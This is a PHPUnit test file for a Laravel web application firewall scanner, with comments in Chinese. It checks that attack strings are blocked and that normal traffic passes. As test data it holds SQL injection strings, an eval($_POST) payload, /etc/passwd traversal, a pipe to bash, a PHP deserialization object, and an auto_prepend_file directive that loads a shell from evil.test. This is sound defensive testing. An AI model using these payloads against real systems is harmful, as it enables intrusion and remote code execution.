<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Support\Waf\PayloadScanner;
use Illuminate\Http\Request;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * 入站 WAF 规则引擎的行为约束。
 *
 * 本测试不启动 Laravel 应用（纯函数级），规则库通过 config() 的容器兜底读取，
 * 因此在 setUp 中直接注入一份与 config/waf.php 同构的规则，避免依赖框架启动。
 */
final class WafPayloadScannerTest extends TestCase
{
    private PayloadScanner $scanner;

    protected function setUp(): void
    {
        parent::setUp();

        // 直接加载 config/waf.php 取真实规则库与限额：测的必须是真正上线的那份
        // 配置，而不是测试里另抄一份——抄的那份迟早与线上漂移，测过了也不代表线上安全。
        /** @var array<string, mixed> $config */
        $config = require dirname(__DIR__, 2).'/config/waf.php';

        $this->scanner = new PayloadScanner($config);
    }

    /**
     * 构造一个请求对象。
     *
     * @param  array<string, mixed>  $query
     * @param  array<string, mixed>  $body
     * @param  array<string, string>  $cookies
     * @param  array<string, string>  $headers
     */
    private function request(
        string $uri = '/api/v2/client/services',
        array $query = [],
        array $body = [],
        array $cookies = [],
        string $ua = 'Mozilla/5.0',
        string $method = 'GET',
        array $headers = [],
    ): Request {
        $request = Request::create($uri, $method, $method === 'GET' ? $query : $body, $cookies);
        $request->headers->set('User-Agent', $ua);

        foreach ($headers as $name => $value) {
            $request->headers->set($name, $value);
        }

        if ($method === 'GET' && $query !== []) {
            $request->query->replace($query);
        }

        return $request;
    }

    // ---------- 攻击载荷应被拦截 ----------

    public function test_detects_sql_union_injection_in_query(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['keyword' => "1' union select password from users--"])
        );

        self::assertNotNull($hit);
        self::assertSame('query', $hit['group']);
    }

    public function test_detects_information_schema_probe(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['id' => '1 and 1=2 union select 1 from information_schema.tables'])
        );

        self::assertNotNull($hit);
    }

    public function test_detects_code_execution_payload_in_body(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(body: ['note' => 'eval($_POST[cmd])'], method: 'POST')
        );

        self::assertNotNull($hit);
        self::assertSame('body', $hit['group']);
    }

    public function test_detects_directory_traversal_in_query(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['file' => '../../../../etc/passwd'])
        );

        self::assertNotNull($hit);
    }

    public function test_detects_env_file_probe_in_path(): void
    {
        $hit = $this->scanner->inspect($this->request(uri: '/.env'));

        self::assertNotNull($hit);
        self::assertSame('path', $hit['group']);
    }

    public function test_detects_git_directory_probe_in_path(): void
    {
        $hit = $this->scanner->inspect($this->request(uri: '/.git/config'));

        self::assertNotNull($hit);
        self::assertSame('path', $hit['group']);
    }

    public function test_detects_scanner_user_agent(): void
    {
        $hit = $this->scanner->inspect($this->request(ua: 'sqlmap/1.7.2#stable'));

        self::assertNotNull($hit);
        self::assertSame('ua', $hit['group']);
    }

    public function test_detects_payload_hidden_in_parameter_name(): void
    {
        // 载荷藏在参数名里：只看值会漏，flatten 必须拼上 key。
        $hit = $this->scanner->inspect(
            $this->request(query: ['union select 1 from information_schema.tables' => '1'])
        );

        self::assertNotNull($hit);
    }

    public function test_detects_payload_in_nested_array(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(body: ['filter' => ['nested' => ['q' => 'union select 1']]], method: 'POST')
        );

        self::assertNotNull($hit);
    }

    // ---------- 正常业务不得误伤 ----------

    /**
     * @param  array<string, mixed>  $query
     */
    #[DataProvider('legitimateQueryProvider')]
    public function test_does_not_flag_legitimate_traffic(array $query): void
    {
        $hit = $this->scanner->inspect($this->request(query: $query));

        self::assertNull($hit, '正常业务参数被误伤：'.json_encode($query, JSON_UNESCAPED_UNICODE));
    }

    /**
     * @return iterable<string, array{array<string, mixed>}>
     */
    public static function legitimateQueryProvider(): iterable
    {
        yield '中文关键词' => [['keyword' => '云服务器 香港 大带宽']];
        yield '分页参数' => [['page' => '2', 'per_page' => '20']];
        yield '订单号' => [['order_no' => 'TU20260828093012345']];
        yield '邮箱' => [['email' => 'user@example.com']];
        yield '域名' => [['domain' => 'my-site.example.com']];
        yield '价格区间' => [['min' => '9.90', 'max' => '1999.00']];
        yield '排序字段' => [['sort' => 'created_at', 'order' => 'desc']];
        yield '状态筛选' => [['status' => 'active']];
        yield 'IP 地址' => [['ip' => '203.0.113.42']];
        yield '含连字符的用户名' => [['username' => 'zhang-san_2026']];
        yield 'URL 参数' => [['redirect' => 'https://console.example.com/dashboard']];
        yield '时间范围' => [['start' => '2026-08-01 00:00:00', 'end' => '2026-08-28 23:59:59']];
    }

    public function test_does_not_flag_normal_browser_user_agent(): void
    {
        $hit = $this->scanner->inspect($this->request(
            ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'
        ));

        self::assertNull($hit);
    }

    public function test_does_not_flag_search_engine_crawler(): void
    {
        $hit = $this->scanner->inspect($this->request(
            ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        ));

        self::assertNull($hit);
    }

    /**
     * 关键回归：本引擎绝不对已解码的输入再做一次 urldecode。
     *
     * 二次解码会把用户字面输入的 %20/%2B/%25 改写，导致卡密、查单密码一类
     * 字段整体失真——这是同类入站过滤层踩过的真实事故形态。本项目从一开始
     * 就不解码，此用例把该约束固化下来——若将来有人"顺手加个 urldecode"，
     * 这条会立刻失败。
     */
    public function test_does_not_double_decode_percent_sequences(): void
    {
        // %2527 二次解码后会变成 %27（单引号），进而可能被 SQL 规则命中。
        // 正确行为：只按字面值匹配，不解码，因此不命中。
        $hit = $this->scanner->inspect(
            $this->request(query: ['code' => 'CARD%2527KEY%250A%252B'])
        );

        self::assertNull($hit, '出现了二次解码，字面 % 序列被改写');
    }

    public function test_empty_request_is_clean(): void
    {
        self::assertNull($this->scanner->inspect($this->request()));
    }

    // ---------- 健壮性 ----------

    public function test_oversized_input_is_fully_scanned_in_blocks(): void
    {
        // 超长输入必须分块覆盖全部字节：既不因正则回溯卡死，也不给"把载荷放在
        // 截断点之后"留免检区——攻击载荷藏在 20 万字节的尾部，仍要命中。
        $hit = $this->scanner->inspect(
            $this->request(body: ['blob' => str_repeat('A', 200000)."' union select 1--"], method: 'POST')
        );

        self::assertNotNull($hit, '超长载荷尾部的攻击串逃逸了规则匹配');
        self::assertSame('body', $hit['group']);
    }

    public function test_oversized_input_does_not_hang(): void
    {
        $started = microtime(true);
        $this->scanner->inspect(
            $this->request(body: ['blob' => str_repeat('A', 200000)], method: 'POST')
        );
        $elapsed = microtime(true) - $started;

        self::assertLessThan(2.0, $elapsed, '超长输入匹配耗时过久，存在 ReDoS 风险');
    }

    public function test_deeply_nested_input_is_rejected_as_fixed_rule(): void
    {
        // 超过 max_depth 的嵌套无法被摊平检查，必须按固定规则拒绝——静默跳过
        // 深层内容等于把第 N 层变成免检区。且不能栈溢出。
        $deep = "union select 1";
        for ($i = 0; $i < 50; $i++) {
            $deep = ['n' => $deep];
        }

        $hit = $this->scanner->inspect($this->request(body: ['deep' => $deep], method: 'POST'));

        self::assertNotNull($hit, '超深嵌套被静默放行');
        self::assertSame('limit', $hit['group']);
        self::assertSame('嵌套层级超限', $hit['name']);
    }

    public function test_invalid_utf8_is_rejected_even_when_clean_payload_is_absent(): void
    {
        // 无效字节会让 u 修饰符的 preg_match 整体失败；若按未命中处理，攻击者
        // 塞一个 \xFF 就能让整条规则库失效。必须按固定规则拒绝。
        $hit = $this->scanner->inspect(
            $this->request(query: ['padding' => "\xFF", 'keyword' => "plain text"])
        );

        self::assertNotNull($hit, '无效 UTF-8 输入被当作未命中放行');
        self::assertSame('limit', $hit['group']);
        self::assertSame('无效字符编码', $hit['name']);
    }

    public function test_clean_payload_hidden_beyond_depth_limit_still_blocked(): void
    {
        // 与上一条互补：即便深层内容本身干净，超限请求也整体拒绝（fail-closed）。
        $deep = 'innocent';
        for ($i = 0; $i < 30; $i++) {
            $deep = ['n' => $deep];
        }

        $hit = $this->scanner->inspect($this->request(body: ['deep' => $deep], method: 'POST'));

        self::assertNotNull($hit);
        self::assertSame('嵌套层级超限', $hit['name']);
    }

    // ---------- 规则元数据与运营开关 ----------

    public function test_hit_carries_rule_id_category_and_severity(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['keyword' => "1' union select password from users--"])
        );

        self::assertNotNull($hit);
        self::assertSame('sqli-union-select', $hit['id'], '命中结果未携带规则稳定 ID');
        self::assertSame('sqli', $hit['category']);
        self::assertSame('critical', $hit['severity']);
    }

    public function test_single_rule_can_be_disabled(): void
    {
        $config = require dirname(__DIR__, 2).'/config/waf.php';
        $config['rules']['query'] = [
            ['id' => 'sqli-union-select', 'name' => 'SQL 联合注入', 'pattern' => 'union[\s/*]+select', 'category' => 'sqli', 'enable' => false],
        ];
        $firewall = new PayloadScanner($config);

        self::assertNull(
            $firewall->inspect($this->request(query: ['keyword' => "1' union select 1--"])),
            'enable=false 的规则仍在参与匹配',
        );

        // 对照组：恢复 enable 后同一请求命中——证明跳过来自 enable 而非正则失效。
        $config['rules']['query'][0]['enable'] = true;
        $enabled = (new PayloadScanner($config))->inspect(
            $this->request(query: ['keyword' => "1' union select 1--"])
        );
        self::assertNotNull($enabled);
    }

    public function test_category_can_be_disabled(): void
    {
        $config = require dirname(__DIR__, 2).'/config/waf.php';
        $config['disabled_categories'] = 'SQLI, sqli'; // 大小写与空白混排也要能停用

        $firewall = new PayloadScanner($config);

        self::assertNull(
            $firewall->inspect($this->request(query: ['keyword' => "1' union select 1--"])),
            'sqli 类别停用后 sqli 规则仍在匹配',
        );
        // 其他类别不受影响：rce 类特征照常命中。
        $hit = $firewall->inspect($this->request(query: ['q' => 'eval($_POST[x])']));
        self::assertNotNull($hit);
        self::assertSame('rce', $hit['category']);
    }

    // ---------- 请求头检测维度 ----------

    public function test_attacks_hidden_in_headers_are_detected(): void
    {
        $hit = $this->scanner->inspect($this->request(headers: [
            'X-Forwarded-For' => "1.2.3.4' union select password from users--",
        ]));

        self::assertNotNull($hit, '藏在自定义头里的攻击载荷未被检测');
        self::assertSame('header', $hit['group']);
    }

    public function test_clean_headers_are_not_flagged(): void
    {
        $hit = $this->scanner->inspect($this->request(headers: [
            'Accept-Language' => 'zh-CN,zh;q=0.9,en;q=0.8',
            'Referer' => 'https://www.example.com/dashboard?page=2',
            'X-Custom-Trace' => 'trace-20260906-001',
        ]));

        self::assertNull($hit, '正常请求头被误伤');
    }

    // ---------- 特征补强（版本注释/管道执行/PHP 反序列化/配置注入） ----------

    public function test_detects_mysql_version_comment_obfuscation(): void
    {
        // /*!5xxxx 是绕过 union 关键词匹配的经典 MySQL 混淆形态。
        $hit = $this->scanner->inspect(
            $this->request(query: ['id' => "1/*!50740AND 1=1"])
        );

        self::assertNotNull($hit);
        self::assertSame('sqli-mysql-version-comment', $hit['id']);
    }

    public function test_detects_pipe_command_execution(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['host' => 'evil.test | bash -c "id"'])
        );

        self::assertNotNull($hit);
        self::assertSame('cmdi-pipe-exec', $hit['id']);
    }

    public function test_detects_php_serialization_payload(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['data' => 'O:8:"Exploit":1:{s:4:"cmd";s:2:"id";}'])
        );

        self::assertNotNull($hit);
        self::assertSame('rce-php-deser', $hit['id']);
    }

    public function test_detects_php_ini_injection_directive(): void
    {
        $hit = $this->scanner->inspect(
            $this->request(query: ['config' => 'auto_prepend_file=http://evil.test/shell.txt'])
        );

        self::assertNotNull($hit);
        self::assertSame('rce-auto-prepend', $hit['id']);
    }
}
